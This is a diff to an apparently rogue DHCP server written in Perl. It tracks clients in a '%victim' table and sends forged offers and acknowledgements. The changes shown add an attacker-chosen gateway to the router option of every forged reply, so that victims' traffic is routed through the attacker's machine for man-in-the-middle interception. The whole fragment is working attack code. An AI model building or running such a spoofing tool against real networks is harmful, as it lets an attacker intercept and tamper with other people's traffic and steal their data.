@@ -21,6 +21,9 @@ my $server = IO::Socket::INET->new(
 	Broadcast => 1,
 ) or die "server socket: $!";
 
+my $gateway = inet_aton($ARGV[1]) // $server->sockaddr;
+print "Gateway: ", inet_ntoa($gateway), "\n";
+
 my $client = IO::Socket::INET->new(
 	Proto => 'udp',
 	Broadcast => 1,
@@ -99,6 +102,8 @@ sub offerTowel {
 	$offer->chaddr($packet->chaddr);
 	$offer->removeOption(DHO_DHCP_MESSAGE_TYPE());
 	$offer->addOptionValue(DHO_DHCP_MESSAGE_TYPE(), DHCPOFFER());
+	$offer->removeOption(DHO_ROUTERS());
+	$offer->addOptionValue(DHO_ROUTERS(), inet_ntoa($gateway));
 
 	$server->send($offer->serialize(), undef, $BRDCAST_TO_CLIENT);
 	$victim{$packet->xid()} = $towel_id;
@@ -117,6 +122,8 @@ sub ackRequest {
 	$ack->chaddr($packet->chaddr);
 	$ack->removeOption(DHO_DHCP_MESSAGE_TYPE());
 	$ack->addOptionValue(DHO_DHCP_MESSAGE_TYPE(), DHCPACK());
+	$ack->removeOption(DHO_ROUTERS());
+	$ack->addOptionValue(DHO_ROUTERS(), inet_ntoa($gateway));
 
 	$server->send($ack->serialize(), undef, $BRDCAST_TO_CLIENT);
 	print "-> DHCPACK ", $packet->xid, " (towel ", $towel_id, ")\n";
